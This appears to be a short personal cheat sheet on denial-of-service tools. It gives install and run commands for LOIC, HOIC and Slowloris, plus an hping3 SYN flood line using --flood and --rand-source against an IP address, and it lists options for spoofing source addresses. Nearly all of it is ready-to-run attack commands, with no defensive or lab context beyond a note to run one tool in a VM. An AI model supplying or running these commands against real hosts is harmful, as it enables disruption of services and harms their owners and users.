# DOS Attack Tools

## LOIC - Low Orbit Ion Cannon


Install mono-complete package *(its used to run some .exe programs on linux)*

```sh
sudo apt install mono-complete
```

> Clone LOIC repo [Link](https://sourceforge.net/p/loicdownload6968/code/ci/main/tree/)  
> `git clone https://git.code.sf.net/p/loicdownload6968/code loicdownload6968-code`

Run `loic.exe` file

```sh
sudo mono loic.exe
OR
env -i DISPLAY=$DISPLAY mono loic.exe
```

## HOIC - High Orbit Ion Cannon

> Download: [Link](https://sourceforge.net/projects/high-orbit-ion-cannon/files/HOIC.zip/download)

Run on Windows VM


## Slowloris

```
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
python3 slowloris.py example.com
```

## hping3

```
sudo hping3 [flags] <target_ip> [options]
```

```
sudo hping3 -S 192.168.1.10 -p 80 --flood --rand-source -c 64
```

Flags
- `-S`: Sets the TCP SYN flag.
- `-A`: Sets the TCP ACK flag.
- `-F`: Sets the TCP FIN flag.
- `-R`: Sets the TCP RST flag.
- `-1`: ICMP mode (Ping).

Options
- `--flood`: Sends packets as fast as possible, ignoring replies.
- `--rand-source`: Uses randomized source IP addresses. 
- `-a` `--spoof <ip>` Spoof a specific, custom source IP address instead of your own.
- `-c <num>` for packet count.
- `-i <seconds>` for interval between packats
